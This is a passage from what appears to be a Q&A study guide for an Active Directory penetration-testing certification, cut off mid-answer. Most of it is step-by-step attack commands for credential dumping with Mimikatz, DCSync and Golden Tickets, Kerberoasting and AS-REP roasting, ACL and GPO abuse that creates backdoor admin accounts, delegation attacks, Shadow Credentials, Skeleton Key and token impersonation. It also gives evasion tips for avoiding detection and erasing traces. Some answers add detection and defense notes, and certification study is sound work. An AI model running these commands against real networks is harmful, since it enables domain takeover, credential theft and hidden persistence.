# If SeImpersonatePrivilege present
# Use PrintSpoofer/JuicyPotato
.\PrintSpoofer.exe -i -c "cmd"
```

Result: Local SYSTEM/Administrator on workstation

**Phase 4: Credential extraction**

As local admin:
```powershell
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
```

Collect:
- Other users' hashes (if they logged in)
- Cached credentials
- Service account credentials
- Kerberos tickets

**Phase 5: Domain enumeration**

Map the domain:
```powershell
# BloodHound collection
.\SharpHound.exe -CollectionMethod All

# Find:
# - High-value targets
# - Attack paths
# - Privilege escalation opportunities
# - Misconfigured ACLs
```

**Phase 6: Lateral movement**

Move to better targets:

Option A: Find machines where you're local admin
```powershell
Find-LocalAdminAccess
```

Option B: Pass-the-hash with extracted credentials
```bash
crackmapexec smb 10.10.10.0/24 -u admin -H HASH
```

Option C: Kerberoast for credentials
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
# Crack offline
hashcat -m 13100 hashes.txt rockyou.txt
```

**Phase 7: Privilege escalation in domain**

Find paths in BloodHound to DA:

Common paths:
- Compromise server where DA logs in
- Exploit ACL: GenericAll on user → reset password → use account
- Exploit ACL: GenericWrite on group → add yourself
- Constrained/Unconstrained delegation abuse
- Service account compromise → service has DA rights

**Phase 8: Domain dominance**

Once DA:
```powershell
# DCSync to get all hashes
lsadump::dcsync /user:krbtgt /domain:corp.local
lsadump::dcsync /user:Administrator /domain:corp.local

# Create Golden Ticket for persistence
kerberos::golden /user:Administrator /domain:corp.local /sid:... /krbtgt:HASH /ticket:golden.kirbi
```

**Phase 9: Persistence**

Maintain access:
- Golden Tickets
- Skeleton Key (Mimikatz)
- Hidden admin accounts
- AdminSDHolder modifications
- Group membership tricks
- DSRM password
- WMI persistence
- Scheduled tasks
- Service account abuse

**Phase 10: Cleanup and report**

For pentest:
- Document everything
- Clean up artifacts
- Provide remediation
- Don't leave persistence in actual engagement

**Timeline:**

CRTP lab: ~10-20 hours
Real engagement: Days to weeks
Real attack: Hours to months (depending on environment)

### Q32: Practical Kerberoasting walkthrough
**A:**

**Real-world Kerberoasting:**

**Step 1: Enumerate users with SPNs**

```powershell
# PowerView
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname

# Output:
# samaccountname     serviceprincipalname
# svc_sql            MSSQLSvc/sqlserver.corp.local
# svc_iis            HTTP/web.corp.local
# svc_backup         MSSQLSvc/backup.corp.local
```

**Step 2: Request all TGS tickets**

```powershell
# Rubeus - request all and save
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Or specific user
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt
```

Output format:
```
$krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sqlserver.corp.local*$E1A3B4C7...
```

**Step 3: Crack offline**

```bash
# Hashcat with wordlist
hashcat -m 13100 hashes.txt rockyou.txt

# With rules
hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule

# With custom mask (e.g., 12 char passwords)
hashcat -m 13100 hashes.txt -a 3 ?u?l?l?l?l?l?l?d?d?d?d?d
```

**Step 4: Verify credentials**

```bash
# Test login
crackmapexec smb dc.corp.local -u svc_sql -p 'CrackedPassword!'

# Or PowerShell
$creds = New-Object System.Management.Automation.PSCredential("svc_sql", (ConvertTo-SecureString "CrackedPassword!" -AsPlainText -Force))
Invoke-Command -ComputerName sqlserver.corp.local -Credential $creds -ScriptBlock {whoami}
```

**Step 5: Use the access**

Service accounts often have specific privileges:
- SQL service account → manage SQL Server
- Backup service → access to file systems
- Sometimes Domain Admin (huge win)

**Step 6: Lateral movement**

Use cracked password elsewhere:
```bash
# Same password might work on multiple systems
crackmapexec smb 10.10.10.0/24 -u svc_sql -p 'CrackedPassword!'
```

**Targeted Kerberoasting (when you can't get full list):**

If you have write access to a user attribute:

```powershell
# Add SPN to user
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='nonexistent/spn'}

# Kerberoast that specific user
Get-DomainUser target_user | Get-DomainSPNTicket -Format Hashcat

# Crack offline
hashcat -m 13100 target_hash.txt rockyou.txt

# Remove SPN to avoid detection
Set-DomainObject -Identity target_user -Clear serviceprincipalname
```

**OPSEC considerations:**

**Stealth:**
- Don't crack all hashes immediately
- Pick most valuable targets
- Crack offline only (no impact on network)
- Don't generate Event 4769 spike

**Detection signals:**
- Unusual TGS requests
- Multiple SPN ticket requests in short time
- Honey accounts triggered

**For CRTP:**

Practice this exact flow. Often initial credential acquisition path. Find weak service account passwords:
- ServiceAccount1
- Password123!
- ServerAdmin!
- Spring2024!

Industry standard passwords work surprisingly often.

### Q33: AS-REP Roasting practical
**A:**

**AS-REP Roasting walkthrough:**

**Step 1: Find vulnerable accounts**

These accounts have "Do not require Kerberos preauthentication" flag.

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired

# AD module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}
```

If you don't have credentials yet, can enumerate without auth:
```bash
# Impacket - no credentials needed if you have usernames list
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass
```

**Step 2: Get user list (if no creds)**

```bash
# Common usernames file
echo "administrator
admin
guest
test
service
backup
helpdesk
itsupport
" > common_users.txt

# Or use enumerated list from null session, LDAP, etc.
```

**Step 3: Request AS-REP**

```bash
# Without credentials (most common)
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass -outputfile hashes.txt

# Output for each preauth-disabled user:
$krb5asrep$23$user@CORP.LOCAL:abc123...
```

If you have credentials:
```bash
GetNPUsers.py corp.local/lowpriv_user:password -dc-ip 10.10.10.10 -request
```

**Step 4: Crack offline**

```bash
hashcat -m 18200 hashes.txt rockyou.txt

# With rules
hashcat -m 18200 hashes.txt rockyou.txt -r best64.rule
```

**Step 5: Use credentials**

Cracked password = login as that user.

**Why accounts have this disabled:**

- Legacy applications requiring it
- Cross-realm scenarios
- Migration artifacts
- Administrator error

**Targeted AS-REP Roasting:**

If you have write access to user's UserAccountControl:

```powershell
# Disable preauth (need write to UserAccountControl)
Set-DomainObject -Identity target_user -XOR @{useraccountcontrol=4194304}

# Now AS-REP roast
GetNPUsers.py corp.local/ -no-pass -userids target_user -dc-ip 10.10.10.10

# Restore (don't leave breadcrumbs)
Set-DomainObject -Identity target_user -XOR @{useraccountcontrol=4194304}
```

**For CRTP:**

Often combined with Kerberoasting in initial enumeration. Check both.

### Q34: ACL-based attacks - practical guide
**A:**

**ACL attacks** = Abusing AD object permissions for privilege escalation.

**Step 1: Discover ACL paths**

```powershell
# PowerView - find what you have rights on
Find-InterestingDomainAcl -ResolveGUIDs | 
    Where-Object {$_.IdentityReferenceName -eq $env:USERNAME}

# Or for groups you're in
Get-DomainGroup -UserName jagdeep | ForEach-Object {
    Find-InterestingDomainAcl -ResolveGUIDs | 
        Where-Object {$_.IdentityReferenceName -eq $_.SamAccountName}
}
```

**BloodHound** is MUCH better for this - visualizes paths.

**Common ACL rights and exploitation:**

**1. GenericAll on user:**

Full control over user object.

Actions:
- Reset password
- Add to groups
- Modify attributes

```powershell
# Reset password
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# Or via net
net user target NewPass123! /domain
```

**2. GenericAll on group:**

Modify membership.

```powershell
# Add yourself
Add-DomainGroupMember -Identity "Domain Admins" -Members "your_user"

# Or
net group "Domain Admins" your_user /add /domain
```

**3. GenericWrite on user:**

Modify writable attributes.

Actions:
- Set SPN (for Kerberoasting)
- Set msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
- Modify logon script
- Set primaryGroupID

```powershell
# Add SPN for targeted Kerberoasting
Set-DomainObject -Identity target -Set @{serviceprincipalname='fake/spn'}
```

**4. WriteDACL on object:**

Modify the ACL itself.

Actions:
- Grant yourself GenericAll
- Grant DCSync rights (on domain object)

```powershell
# Grant yourself rights
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity your_user -Rights All
```

**5. WriteOwner:**

Change object owner. Owner = effective GenericAll.

```powershell
# Take ownership
Set-DomainObjectOwner -Identity target -OwnerIdentity your_user

# Then grant yourself rights
Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity your_user -Rights All
```

**6. ForceChangePassword:**

Change password without knowing old.

```powershell
Set-DomainUserPassword -Identity target -AccountPassword $secpass
```

**7. AddSelf on group:**

Add yourself to group (limited).

```powershell
Add-DomainGroupMember -Identity "Group Name" -Members $env:USERNAME
```

**8. AllExtendedRights on user:**

Allows many actions including password reset.

**9. WriteSPN on user:**

Add SPN to user for Kerberoasting.

**10. AddKeyCredentialLink:**

Modify msDS-KeyCredentialLink (Shadow Credentials attack).

```powershell
# Whisker tool
.\Whisker.exe add /target:target_user

# Output: Rubeus command to use the cert for auth
.\Rubeus.exe asktgt /user:target_user /certificate:base64cert /password:cert_pass
```

**11. DCSync (Replicating Directory Changes):**

If you have these rights on domain object:
- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All

```powershell
lsadump::dcsync /user:krbtgt /domain:corp.local
```

**Common ACL attack chains:**

**Chain 1:**
You have GenericWrite on User → Set SPN → Kerberoast → Crack → Login as user → Repeat with their access

**Chain 2:**
You have GenericAll on Group → Add yourself → Now have group's rights → Continue chain

**Chain 3:**
You have WriteDACL on Domain → Grant yourself DCSync → DCSync → Get krbtgt → Golden Ticket

**Tools:**

- **PowerView** - PowerShell-based
- **PowerSploit** - Older but functional
- **BloodHound** - Visualization and queries
- **Impacket** - Linux-based scripts
- **AD Module** - Microsoft official

**For CRTP:**

ACL attacks central to most attack paths. BloodHound is your best friend - shows paths automatically.

### Q35: GPO abuse for compromise
**A:**

**GPO abuse** = Modify Group Policy to execute code or change settings on all affected machines.

**Why powerful:**
- GPOs apply to many machines
- Run as SYSTEM
- Often less monitored
- Persistent (until GPO removed)

**Requirements:**

Write access to GPO. Common sources:
- Group Policy Creator Owners (default group)
- GPO owner (sometimes regular users)
- Explicit ACL grants
- Domain Admins (obviously)

**Discovery:**

```powershell
# Find GPOs you can modify
Get-DomainObjectAcl -SearchBase "LDAP://CN=Policies,CN=System,DC=corp,DC=local" -ResolveGUIDs | 
    Where-Object {$_.IdentityReferenceName -eq $env:USERNAME -or 
                  $_.IdentityReferenceName -in (Get-DomainGroup -UserName $env:USERNAME).Name}

# Find what objects GPO applies to
Get-DomainGPO -Identity "GPO Name" | Get-DomainOU
```

**Attack: Add malicious script to GPO**

**1. Identify writable GPO:**

```powershell
Get-DomainObjectAcl -ResolveGUIDs -Identity "*" | 
    Where-Object { ($_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll") -and 
                   ($_.IdentityReferenceName -eq "your_user") }
```

**2. Modify GPO to add startup script:**

```powershell
# SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators evil_user /add" --GPOName "Default Domain Policy"

# Or
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName "evil.bat" --ScriptContents "net user evil_user Password123! /add /domain" --GPOName "VulnGPO"
```

**3. Wait for GPO refresh (90 minutes default) or force:**

```cmd
gpupdate /force
```

**4. Script runs on all affected machines as SYSTEM:**

Result: Code execution everywhere GPO applies.

**Specific GPO-based attacks:**

**1. Computer startup script:**
- Runs as SYSTEM
- On every machine the GPO applies to

**2. User logon script:**
- Runs as user
- Less privileges but widespread

**3. Software installation:**
- MSI deployment
- Can be malicious package

**4. Logon banner/warning:**
- Less impact but can be defacement

**5. Firewall rules:**
- Open ports for attacker
- Disable defenses

**6. Service configuration:**
- Disable security services
- Enable insecure services

**7. Local user/group changes:**
- Add user to local admins
- Create backdoor account

**8. Registry modifications:**
- Disable UAC
- Enable WDigest (for plaintext passwords)
- Disable security features

**Path traversal in GPO:**

GPO file structure:
```
\\corp.local\SYSVOL\corp.local\Policies\{GUID}\
├── Machine\
│   └── Microsoft\
│       └── Windows NT\
│           └── SecEdit\
│               └── GptTmpl.inf
└── User\
```

If you have write access to SYSVOL share:
- Modify policy files directly
- Add scripts to Scripts folder

**Detection:**

- GPO modification events
- Unusual scripts in SYSVOL
- Scheduled task creation via GPO
- Service modifications

**Defense:**

1. **Audit GPO ACLs**
2. **Restrict GPO creators**
3. **Monitor SYSVOL changes**
4. **Tier 0 protection for GPO administration**
5. **Use Restricted Groups properly**

**For CRTP:**

GPO abuse common attack path. Look for:
- Users in "Group Policy Creator Owners"
- ACL on GPOs grants writes
- Old GPOs with weak protection

### Q36: Unconstrained Delegation attack in detail
**A:**

**Unconstrained delegation** = Server can use any user's TGT to access other services.

**Why dangerous:**

When user authenticates to server:
- User's TGT (not just service ticket) is sent
- Server can store TGT in memory
- Server can use TGT to access ANY service as that user

If you compromise such a server → wait for high-priv user → steal TGT → impersonate anywhere.

**Step 1: Find unconstrained delegation:**

```powershell
# PowerView
Get-DomainComputer -Unconstrained | Select dnshostname

# Filter out DCs (DCs always have unconstrained, not interesting)
Get-DomainComputer -Unconstrained -Properties dnshostname, useraccountcontrol | 
    Where-Object {$_.useraccountcontrol -notmatch "TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT"}

# Output non-DC unconstrained machines
```

Common non-DC unconstrained:
- Old print servers
- Legacy file servers
- Specific application servers
- Misconfigured Exchange

**Step 2: Compromise such machine:**

You need local admin on the unconstrained machine. Use any technique:
- Vulnerability exploitation
- Credential reuse
- Kerberoasting
- Other AD attacks

**Step 3: Wait or coerce authentication:**

Option A: Wait for legitimate admin to authenticate.

Option B: Coerce authentication (better - immediate result):

**PrinterBug (SpoolSample):**
```powershell
# Force DC$ to authenticate to your unconstrained host
.\SpoolSample.exe DC_HOSTNAME UNCONSTRAINED_HOST_FQDN

# Or PetitPotam (different protocol)
python3 PetitPotam.py UNCONSTRAINED_HOST DC_IP

# Or DFSCoerce
```

When DC connects:
- DC must use Kerberos
- DC sends its TGT (because of unconstrained delegation)
- TGT lands in your machine's memory

**Step 4: Monitor for and extract TGT:**

```powershell
# Mimikatz - watch for tickets
sekurlsa::tickets /export

# Or Rubeus (real-time)
.\Rubeus.exe monitor /interval:1 /filteruser:DC_NAME$
```

When DC authenticates, you'll see TGT for `DC_NAME$@CORP.LOCAL`.

**Step 5: Use the TGT:**

```powershell
# Pass-the-ticket
.\Rubeus.exe ptt /ticket:[base64_TGT]

# Or with Mimikatz
kerberos::ptt DC_TGT.kirbi
```

Now you have authentication context of DC$ machine account.

**Step 6: DCSync as DC$:**

DC machine accounts have replication rights:
```powershell
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local
```

You now have KRBTGT hash → Golden Ticket → total domain compromise.

**Alternative: Wait for human admin:**

If admin logs into unconstrained machine:
1. Their TGT in memory
2. Extract via mimikatz
3. Use for impersonation

**Patches:**

PrintNightmare and SpoolSample patches mitigate but workarounds exist.

**OPSEC:**

- Coercion creates network traffic
- Print Spooler events
- Authentication events on DC

**Defense:**

1. **Remove unconstrained delegation** wherever possible:
```powershell
# Find
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | Where-Object {$_.PrimaryGroupID -ne 516}

# Remove
Set-ADAccountControl -Identity COMPUTER -TrustedForDelegation $false
```

2. **Use constrained or RBCD instead**

3. **Protected Users group** - members can't have TGT delegated

4. **Sensitive accounts** - "Account is sensitive and cannot be delegated"

5. **Disable Spooler service** on DCs and unconstrained hosts:
```powershell
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

6. **Monitor authentication coercion attempts**

**For CRTP:**

Classic attack chain. Practice:
1. Find unconstrained delegation
2. Get local admin on the machine
3. SpoolSample DC
4. Capture TGT
5. DCSync
6. Domain compromise

### Q37: Resource-Based Constrained Delegation (RBCD)
**A:**

**RBCD** = New-style constrained delegation. Target controls who can delegate TO it.

**Configuration:**

Target object has attribute: `msDS-AllowedToActOnBehalfOfOtherIdentity`

This attribute lists SIDs of accounts allowed to delegate to the target.

**Attack scenario:**

You have GenericWrite (or equivalent) on a target computer.

You don't currently control any account with delegation rights.

Solution: Create your own machine account, configure it to delegate to target.

**Prerequisites:**

1. **MachineAccountQuota > 0:**
   - Default: 10 per user
   - Check:
   ```powershell
   Get-DomainObject -Identity "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota
   ```

2. **GenericWrite (or better) on target machine**

**Step 1: Create computer account:**

```powershell
# Powermad
New-MachineAccount -MachineAccount "rbcd_attack$" -Password (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)

# Or Impacket
addcomputer.py -computer-name 'rbcd_attack$' -computer-pass 'P@ssw0rd123!' corp.local/lowpriv_user:password
```

**Step 2: Set delegation:**

```powershell
# PowerView
$ComputerSid = Get-DomainComputer "rbcd_attack" -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Set-DomainObject -Identity "TARGET_COMPUTER" -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Or simpler with Set-ADComputer:
```powershell
Set-ADComputer TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount rbcd_attack$
```

**Step 3: Use S4U attacks to access target:**

```powershell
# Get hash of your created computer account
Add-Type -AssemblyName 'System.IdentityModel'
$securePass = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
$pass = New-Object System.Management.Automation.PSCredential('rbcd_attack$', $securePass)

# Use Rubeus to perform S4U attack
.\Rubeus.exe s4u /user:rbcd_attack$ /rc4:[NTLM_HASH_OF_PASSWORD] /impersonateuser:Administrator /msdsspn:cifs/TARGET_COMPUTER.corp.local /ptt

# Now access target
dir \\TARGET_COMPUTER.corp.local\C$
```

**Step 4: Lateral movement:**

You now have authentication as Administrator on TARGET_COMPUTER:
- Mimikatz on TARGET_COMPUTER for more credentials
- Continue attack chain

**Variations:**

**1. RBCD on Domain Controller:**

If you can write to DC computer object → take over domain.

**2. RBCD chain:**

Compromise machine A → write to machine B → control B → write to C → ...

**3. RBCD with cross-domain:**

Some configurations allow cross-domain RBCD.

**Common scenarios where RBCD possible:**

- You have GenericWrite on computer via group membership
- Default Active Directory "Authenticated Users" can create computers
- Specific accounts have AddComputer right
- Misconfigured ACLs

**Detection:**

- Computer account creation by user
- msDS-AllowedToActOnBehalfOfOtherIdentity modifications
- S4U2Self/S4U2Proxy requests
- Service ticket requests from new computer accounts

**Defense:**

1. **Set MachineAccountQuota to 0:**
```powershell
Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

2. **Audit computer ACLs**

3. **Protected Users / Sensitive accounts**

4. **Tier 0 protection**

5. **Monitor for delegation changes**

**For CRTP:**

RBCD is modern attack vector. Practice creating machine accounts and S4U attacks.

### Q38: Shadow Credentials attack (msDS-KeyCredentialLink)
**A:**

**Shadow Credentials** = Add certificate-like keys to user's `msDS-KeyCredentialLink` for authentication.

**Background:**

`msDS-KeyCredentialLink` attribute stores Windows Hello for Business / passwordless authentication credentials. Each entry contains:
- Key material (public key)
- Key ID
- Creation time
- Device info

**Attack:**

If you can write to user's `msDS-KeyCredentialLink`:
- Add your own key
- Authenticate as that user via PKINIT (Kerberos with certificates)
- No password needed

**Requirements:**

- GenericWrite, GenericAll, WriteProperty, or AllExtendedRights on target
- Windows Server 2016+ functional level
- ADCS not required (Windows Hello doesn't need it)

**Step 1: Identify writable users:**

```powershell
# Find users you can write to
Find-InterestingDomainAcl -ResolveGUIDs | 
    Where-Object {$_.IdentityReferenceName -eq $env:USERNAME -and 
                  $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|AllExtendedRights"}
```

**Step 2: Add shadow credential:**

```powershell
# Whisker tool (or pyWhisker for Linux)
.\Whisker.exe add /target:victim_user

# Output:
# [+] Adding Key Credential to attribute msDS-KeyCredentialLink of 'victim_user'
# [+] Key Credential added!
# [+] You can now run Rubeus with the following syntax:
# Rubeus.exe asktgt /user:victim_user /certificate:[BASE64_PFX] /password:"[PASSWORD]" /domain:corp.local /dc:dc.corp.local /getcredentials /show
```

**Step 3: Request TGT with certificate:**

```powershell
.\Rubeus.exe asktgt /user:victim_user /certificate:BASE64_PFX /password:"PFX_PASSWORD" /domain:corp.local /dc:dc.corp.local /getcredentials /ptt
```

Output includes:
- TGT for victim_user
- NTLM hash of victim_user (because PKINIT response includes it!)

**Step 4: Use TGT or NTLM hash:**

```powershell
# TGT already injected via /ptt
dir \\target\C$

# Or use NTLM hash for pass-the-hash
crackmapexec smb target -u victim_user -H NTLM_HASH
```

**Why this attack is powerful:**

1. **No password reset required** - victim doesn't know
2. **Persistent** - certificate valid for ~30 days by default
3. **Avoids detection** - looks like Windows Hello
4. **Returns NTLM hash** - bonus credential
5. **Works without ADCS** - PKINIT built into Kerberos

**Cleanup:**

```powershell
# Remove your shadow credential
.\Whisker.exe remove /target:victim_user /devid:[device_id]

# Or remove all
.\Whisker.exe clear /target:victim_user
```

**Linux version (pyWhisker):**

```bash
# Add key
python3 pywhisker.py -d corp.local -u attacker -p password --target victim --action add

# Use with Impacket
python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass 'password' corp.local/victim victim.ccache

export KRB5CCNAME=victim.ccache
secretsdump.py -k -no-pass corp.local/victim@dc.corp.local
```

**Detection:**

- `msDS-KeyCredentialLink` modifications
- PKINIT authentication events
- Unusual certificate-based authentication
- Event ID 4768 with certificate info

**Defense:**

1. **Audit msDS-KeyCredentialLink** for unexpected entries

2. **Restrict write access** to user objects

3. **Monitor PKINIT auth:**
```
Event ID: 4768
Pre-authentication Type: 16 (PKINIT)
```

4. **Microsoft Defender for Identity** detects shadow credentials

5. **Privileged Access Management**

**For CRTP:**

Newer attack technique, may be in updated CRTP content. Excellent persistence method.

### Q39: Skeleton Key attack (Mimikatz)
**A:**

**Skeleton Key** = Patch LSASS on DC to accept master password for any user.

**Effect:**

After Skeleton Key applied:
- Original password STILL works for users
- ADDITIONAL "master" password also works
- Master password: "mimikatz" by default
- Persistent until DC reboot

**Requirements:**
- Domain Admin or equivalent
- Code execution on DC

**Step 1: Get DA access**

(Various methods covered elsewhere)

**Step 2: Execute on DC:**

```powershell
# On DC, as DA
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

Output:
```
[KDC] data
[KDC] struct
[KDC] keys patch OK
[RC4] functions
[RC4] init patch OK
[RC4] decrypt patch OK
```

**Step 3: Use master password:**

```bash
# Any user, password "mimikatz" works
crackmapexec smb dc.corp.local -u Administrator -p mimikatz
crackmapexec smb dc.corp.local -u SomeUser -p mimikatz
```

**Persistence properties:**

- Survives Group Policy refreshes
- Survives most operations
- Lost on DC reboot
- Must be re-applied to all DCs

**Detection:**

- LSASS modifications
- Authentication with unusual patterns
- Multiple users authenticating with same "weak" password
- Microsoft Defender for Identity detects

**Defense:**

1. **Reboot DCs** if compromise suspected

2. **Credential Guard** - prevents LSASS patching

3. **Protected Process Light** for LSASS

4. **Monitor LSASS access**

5. **Limit DA accounts**

6. **Privileged Access Workstations**

**Custom variants:**

Newer variants:
- Custom master password
- Different mimikatz module versions
- Targeted activation (specific users only)

```powershell
# Custom password (newer Mimikatz)
mimikatz # misc::skeleton /password:CustomMaster123
```

**For CRTP:**

Demonstrates total domain compromise. Persistence option after gaining DA.

### Q40: AdminSDHolder and SDProp
**A:**

**AdminSDHolder** = Special object whose ACL is copied to all privileged accounts every 60 minutes.

**Why exists:**

Protect privileged groups (DA, EA, etc.) from accidental ACL changes. AdminSDHolder ACL is the "template".

**SDProp process:**

Every 60 minutes (configurable):
1. SDProp runs on PDC
2. Reads AdminSDHolder ACL
3. Copies to all members of protected groups
4. Overrides any ACL changes made on protected accounts

**Protected groups (default):**

- Account Operators
- Administrators
- Backup Operators
- Domain Admins
- Domain Controllers
- Enterprise Admins
- Print Operators
- Replicator
- Schema Admins
- Server Operators

**Attack: Modify AdminSDHolder ACL**

If you can modify AdminSDHolder:
- Add yourself with GenericAll
- Within 60 min, you have GenericAll on all DAs
- Persistent through normal admin operations

**Steps:**

**1. Get write access to AdminSDHolder:**

Usually requires DA. But:
- Misconfigurations
- Older configs from past admins
- Compromised accounts with delegation

**2. Modify ACL:**

```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity "AdminSDHolder" -PrincipalIdentity attacker_user -Rights All

# Or
$acl = Get-ACL "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$identity = [System.Security.Principal.NTAccount]"corp\attacker"
$rights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
$type = [System.Security.AccessControl.AccessControlType]::Allow
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $rights, $type)
$acl.AddAccessRule($ace)
Set-ACL "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local" $acl
```

**3. Wait for SDProp (60 min) or force:**

```powershell
# Force SDProp
Get-Process | ? {$_.ProcessName -eq "lsass"} | % {
    # SDProp triggered by writing to specific registry on PDC
}
```

Or just wait.

**4. After SDProp:**

You have GenericAll on all DAs, EAs, etc.

Use it:
```powershell
# Reset DA password
Set-DomainUserPassword -Identity domain_admin_user -AccountPassword $secPass
```

**Persistence mechanism:**

If detected and removed from a specific DA:
- Within 60 min, SDProp restores your access from AdminSDHolder
- Persistent until AdminSDHolder ACL fixed

**Cleanup difficulty:**

Defenders must:
1. Find and remove from AdminSDHolder
2. Force SDProp to propagate clean ACL
3. Verify all protected accounts are clean

**Detection:**

- AdminSDHolder ACL changes (Event 5136)
- Unusual rights on privileged accounts
- New ACEs on multiple admin accounts simultaneously (post-SDProp)

**Defense:**

1. **Audit AdminSDHolder ACL** regularly:
```powershell
Get-ObjectAcl -SearchBase "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs
```

2. **Restrict write access** to AdminSDHolder

3. **Monitor SDProp activity**

4. **Reset KRBTGT after detection**

5. **Privileged Access Management**

**For CRTP:**

Persistence technique. Demonstrates deep domain compromise understanding.

### Q41: Token impersonation
**A:**

**Token impersonation** = Use another user's security token to perform actions as them.

**Background:**

Each process has a token containing:
- User SID
- Group SIDs
- Privileges
- Integrity level

If you can impersonate another process's token, you can act as that user.

**Required privilege:**

`SeImpersonatePrivilege` - allows impersonation.

Default holders:
- Local SYSTEM
- Local Service
- Network Service
- Local Administrators
- IIS users (when running as their app pool identity)

**Discovery:**

```cmd
whoami /priv

# Look for:
# SeImpersonatePrivilege         Impersonate a client after authentication
```

**Common exploitation tools:**

**1. PrintSpoofer (modern, popular):**

Abuses Print Spooler service to impersonate.

```powershell
# Get a SYSTEM shell
.\PrintSpoofer.exe -i -c "cmd.exe"

# Run specific command
.\PrintSpoofer.exe -c "net user attacker Password123! /add" -i
```

**2. JuicyPotato (older, sometimes works):**

```cmd
JuicyPotato.exe -l 9999 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
```

CLSIDs needed for specific Windows versions.

**3. RoguePotato:**

For newer Windows where JuicyPotato patched.

**4. SweetPotato / GenericPotato:**

Variations for specific scenarios.

**5. Mimikatz token::elevate:**

```powershell
mimikatz # token::elevate
```

Impersonate SYSTEM token.

```powershell
# Specific user
mimikatz # token::list
mimikatz # token::elevate /user:Administrator
```

**Manual token impersonation:**

If you have SYSTEM:
```powershell
# List all tokens on system
mimikatz # token::list

# Pick high-privilege user's token
mimikatz # token::elevate /user:domainadmin@corp.local
```

Now your process operates as that user.

**Use cases:**

**1. SeImpersonatePrivilege → SYSTEM:**

You're a service account with SeImpersonate. Use Potato attack to get SYSTEM. Now you can do anything on machine.

**2. SYSTEM → Domain Admin:**

You're SYSTEM on a machine where DA is logged in.

Mimikatz:
```powershell
sekurlsa::logonpasswords
# Or impersonate their token
token::elevate /user:domainadmin
```

**3. Process token theft:**

Find process running as target user, steal its token.

```c
// Pseudocode
OpenProcess(targetPID)
OpenProcessToken
DuplicateToken
CreateProcessWithToken
```

**Token attacks programmatically:**

C# example concept:
```csharp
// Find LSASS or other process
var process = Process.GetProcessesByName("explorer")[0];

// Open process
IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, process.Id);

// Open process token
IntPtr hToken;
OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, out hToken);

// Duplicate
IntPtr hNewToken;
DuplicateTokenEx(hToken, ..., out hNewToken);

// Create process with token
CreateProcessWithTokenW(hNewToken, ..., "cmd.exe", ...);
```

**Detection:**

- Unusual token operations
- SeImpersonatePrivilege used by non-service accounts
- Process creation as system from unexpected processes
- Sysmon Event 1 (process creation) with parent inconsistencies

**Defense:**

1. **Limit SeImpersonatePrivilege** - only services that need it

2. **Credential Guard** - prevents some token theft

3. **Application sandboxing**

4. **Service account hardening:**
   - Run with minimum privileges
   - Use managed service accounts
   - Avoid network service

5. **Monitor for impersonation**

**For CRTP:**

Often the path from low-priv to admin on individual hosts. Master Potato attacks.

### Q42: Lateral movement with Cobalt Strike concepts
**A:**

**Cobalt Strike** = Commercial C2 framework. Standard for red team operations.

(Note: Cobalt Strike not in CRTP scope but conceptually important. Same techniques work with open-source alternatives like Sliver, Havoc, Mythic.)

**Core concepts:**

**Beacons:**
- Implants on compromised hosts
- Connect to team server
- HTTP, HTTPS, DNS, SMB pipes
- Asynchronous communication

**Lateral movement commands:**

**1. psexec (uses SMB):**
```
beacon> psexec target SMB_BEACON
beacon> psexec64 target SMB_BEACON
```

**2. psexec_psh (PowerShell-based):**
```
beacon> psexec_psh target SMB_BEACON
```

**3. wmi (uses WMI):**
```
beacon> wmi target SMB_BEACON
```

**4. winrm (uses PowerShell remoting):**
```
